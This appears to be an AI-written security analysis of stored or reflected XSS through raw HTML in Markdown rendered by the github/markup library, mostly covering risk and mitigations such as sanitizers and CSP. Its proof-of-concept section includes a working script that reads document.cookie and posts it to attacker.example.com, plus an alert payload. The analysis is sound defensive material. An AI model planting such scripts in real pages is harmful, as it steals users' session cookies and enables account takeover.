Okay, here's a deep analysis of the specified attack tree path, focusing on the `github/markup` library and the risk of HTML injection leading to XSS.

## Deep Analysis of Attack Tree Path 1.1.2.1: Inject Malicious `<script>` Tags (HTML Injection)

### 1. Define Objective, Scope, and Methodology

**Objective:**

The primary objective of this deep analysis is to thoroughly understand the vulnerability presented by attack path 1.1.2.1, specifically focusing on how the `github/markup` library's handling (or lack thereof) of raw HTML input can lead to Cross-Site Scripting (XSS) vulnerabilities.  We aim to identify the precise conditions under which this vulnerability is exploitable, the potential impact, and the most effective mitigation strategies.  We will also analyze why `github/markup` is *not* a suitable solution for preventing this vulnerability.

**Scope:**

*   **Target Application:**  Any application that utilizes the `github/markup` library to render user-provided Markdown content, particularly where raw HTML input is permitted (either intentionally or unintentionally).
*   **Attack Vector:**  Injection of malicious `<script>` tags within the Markdown input.
*   **Vulnerability Type:**  Cross-Site Scripting (XSS), specifically Stored XSS (if the malicious input is saved) or Reflected XSS (if the malicious input is immediately rendered back to the user).
*   **Library Focus:**  `github/markup` (https://github.com/github/markup).  We will examine its documentation and, if necessary, its source code to understand its behavior regarding HTML.
*   **Exclusion:**  We will not deeply analyze other potential XSS vectors *outside* of the direct injection of `<script>` tags via raw HTML in Markdown.  Other attack vectors (e.g., exploiting vulnerabilities in specific Markdown renderers used by `github/markup`) are out of scope for this specific analysis, although they should be considered in a broader security assessment.

**Methodology:**

1.  **Documentation Review:**  We will begin by thoroughly reviewing the official documentation for `github/markup` to understand its intended purpose, its handling of HTML, and any security-related warnings or recommendations.
2.  **Code Analysis (if necessary):** If the documentation is insufficient to fully understand the library's behavior, we will examine relevant portions of the `github/markup` source code.  This will help us determine how it processes different Markdown formats and how it interacts with underlying rendering libraries.
3.  **Vulnerability Assessment:** Based on the documentation and/or code analysis, we will assess the likelihood and impact of the vulnerability.  We will consider different scenarios, such as different configurations of `github/markup` and different types of user input.
4.  **Mitigation Analysis:** We will analyze the effectiveness of the proposed mitigations, focusing on why disabling raw HTML is the preferred solution and why a robust HTML sanitizer is *essential* if raw HTML is unavoidable.  We will also explain why `github/markup` itself cannot be relied upon for sanitization.
5.  **Proof-of-Concept (PoC) (Conceptual):** We will describe a conceptual PoC to demonstrate the vulnerability, outlining the steps an attacker would take.  We will *not* provide executable exploit code.
6.  **Recommendations:** We will provide clear, actionable recommendations for developers to mitigate the vulnerability.

### 2. Deep Analysis of Attack Tree Path 1.1.2.1

**2.1 Documentation Review of `github/markup`**

The `github/markup` library's README (as of the current understanding) explicitly states that it is *not* a security tool and should *not* be used to sanitize user input.  It acts as a dispatcher, selecting an appropriate underlying library to render different markup formats (e.g., Markdown, AsciiDoc, Textile).  It does *not* perform any HTML sanitization itself.  This is a crucial point: `github/markup` is designed for rendering trusted markup, not for protecting against malicious input.

The README includes a prominent warning:

> **:warning: GitHub Markup should not be used to render any markup submitted by untrusted users. :warning:**

This warning directly addresses the core issue of this attack path.  The library's authors explicitly acknowledge that it is not designed to handle potentially malicious input.

**2.2 Vulnerability Assessment**

*   **Likelihood: High (if raw HTML is enabled or unintentionally allowed).**  If the application using `github/markup` allows users to input raw HTML, either directly or through a Markdown feature that permits HTML (some Markdown implementations allow this), the likelihood of this vulnerability is very high.  Attackers can easily craft malicious `<script>` tags.  Even if raw HTML is *intended* to be disabled, misconfigurations or bypasses in the application's input validation could inadvertently allow it.
*   **Impact: Very High.**  Successful exploitation leads to a client-side XSS vulnerability.  This allows the attacker to execute arbitrary JavaScript code in the context of the victim's browser.  The consequences include:
    *   **Session Hijacking:**  The attacker can steal the victim's session cookies, allowing them to impersonate the victim.
    *   **Data Theft:**  The attacker can access and exfiltrate sensitive data displayed on the page or accessible through JavaScript APIs.
    *   **Defacement:**  The attacker can modify the content of the page, potentially displaying malicious or misleading information.
    *   **Phishing:**  The attacker can inject realistic-looking login forms or other prompts to trick the victim into providing credentials.
    *   **Drive-by Downloads:**  The attacker can potentially force the victim's browser to download and execute malware.
*   **Effort: Low.**  Injecting a `<script>` tag is a trivial task for an attacker with basic HTML and JavaScript knowledge.
*   **Skill Level: Low.**  No advanced hacking skills are required.
*   **Detection Difficulty: Low (for client-side effects) to Medium (for server-side detection).**  The effects of the XSS attack may be immediately visible to the victim (e.g., pop-up alerts, page modifications).  However, more subtle attacks (e.g., silent cookie theft) may not be immediately apparent.  Server-side detection requires careful input and output analysis, logging, and potentially intrusion detection systems.

**2.3 Mitigation Analysis**

*   **Preferred: Disable Raw HTML Input Entirely.** This is the most secure and recommended approach.  If the application does not need to support raw HTML input, it should be completely disabled.  This eliminates the attack vector entirely.  This often involves configuring the Markdown parser used by `github/markup` to disallow HTML.  For example, if `github/markup` is using a CommonMark-compliant parser, ensure that the `UNSAFE` option (which allows raw HTML) is *not* enabled.
*   **If Raw HTML is Required: Use a Robust HTML Sanitizer *After* `github/markup` Processing.**  If the application *must* allow users to input some HTML, a robust, well-maintained HTML sanitizer is absolutely essential.  This sanitizer should be applied *after* `github/markup` has rendered the Markdown.  It is crucial to understand that `github/markup` itself performs *no* sanitization.  The sanitizer should:
    *   **Whitelist Safe Tags and Attributes:**  Instead of trying to blacklist dangerous elements, the sanitizer should define a whitelist of allowed HTML tags (e.g., `<b>`, `<i>`, `<a>`, `<img>`) and attributes (e.g., `href` for `<a>`, `src` for `<img>`).  Anything not on the whitelist should be removed or escaped.
    *   **Handle Malformed HTML:**  The sanitizer should be able to gracefully handle malformed or incomplete HTML, preventing potential bypasses.
    *   **Prevent Attribute-Based XSS:**  The sanitizer should carefully validate attribute values, especially for attributes like `href` and `src`, to prevent JavaScript injection (e.g., `href="javascript:alert(1)"`).
    *   **Be Regularly Updated:**  The sanitizer should be actively maintained and updated to address newly discovered vulnerabilities and bypass techniques.
    *   **Examples:**
        *   **OWASP Java HTML Sanitizer:** A well-regarded and actively maintained sanitizer for Java applications.
        *   **Bleach (Python):** A popular and robust HTML sanitization library for Python.
        *   **DOMPurify (JavaScript):** A fast and reliable sanitizer for client-side use (though server-side sanitization is generally preferred).

*   **Why `github/markup` is NOT a Sanitizer:**  As emphasized repeatedly, `github/markup` is a *markup rendering library*, not a security tool.  It is designed to translate markup languages into HTML, not to protect against malicious input.  Relying on `github/markup` for sanitization is a fundamental misunderstanding of its purpose and will leave the application vulnerable.

**2.4 Conceptual Proof-of-Concept (PoC)**

1.  **Attacker Input:** The attacker submits the following Markdown input to the application:

    ```markdown
    This is some text.

    <script>alert('XSS!');</script>

    More text.
    ```
    Or, a more stealthy version:
    ```markdown
    <script>
    // Steal cookies and send them to the attacker's server
    var cookies = document.cookie;
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://attacker.example.com/steal-cookies", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send("cookies=" + encodeURIComponent(cookies));
    </script>
    ```

2.  **`github/markup` Processing:**  If raw HTML is enabled (or unintentionally allowed), `github/markup` will pass this input to the underlying Markdown renderer.  The renderer will likely convert the Markdown to HTML, *including* the attacker's `<script>` tag.

3.  **HTML Output:** The resulting HTML will contain the malicious script:

    ```html
    <p>This is some text.</p>
    <script>alert('XSS!');</script>
    <p>More text.</p>
    ```

4.  **Victim's Browser:** When a victim views the rendered content, their browser will execute the JavaScript code within the `<script>` tag.  In the first example, an alert box will pop up.  In the second example, the victim's cookies will be silently sent to the attacker's server.

**2.5 Recommendations**

1.  **Disable Raw HTML Input:**  This is the most crucial and effective mitigation.  Configure the Markdown parser used by `github/markup` to disallow raw HTML.  Ensure that any application-level input validation also prevents raw HTML.
2.  **Implement a Robust HTML Sanitizer (If Raw HTML is Unavoidable):**  If raw HTML input is absolutely necessary, use a well-maintained HTML sanitizer *after* `github/markup` processing.  Choose a sanitizer appropriate for your application's technology stack (e.g., OWASP Java HTML Sanitizer, Bleach, DOMPurify).  Configure the sanitizer to use a whitelist approach, allowing only safe HTML tags and attributes.
3.  **Regular Security Audits:**  Conduct regular security audits and penetration testing to identify and address potential vulnerabilities, including XSS.
4.  **Content Security Policy (CSP):** Implement a strong Content Security Policy (CSP) to mitigate the impact of XSS vulnerabilities.  CSP allows you to control the sources from which the browser can load resources (e.g., scripts, stylesheets, images), limiting the attacker's ability to inject malicious code.
5.  **Input Validation and Output Encoding:**  While not a primary defense against XSS in this specific scenario (since `github/markup` handles the rendering), always practice defense-in-depth.  Validate all user input and properly encode output in other parts of the application to prevent other types of injection attacks.
6.  **Educate Developers:**  Ensure that all developers working on the application understand the risks of XSS and the proper use of `github/markup` and HTML sanitizers.
7. **Monitor and Log:** Implement robust monitoring and logging to detect and respond to potential XSS attacks. Log all user input and rendered output, and monitor for suspicious activity.

By following these recommendations, developers can significantly reduce the risk of XSS vulnerabilities associated with using the `github/markup` library and ensure the security of their applications. The key takeaway is to never trust user input and to understand that `github/markup` is not designed for security.
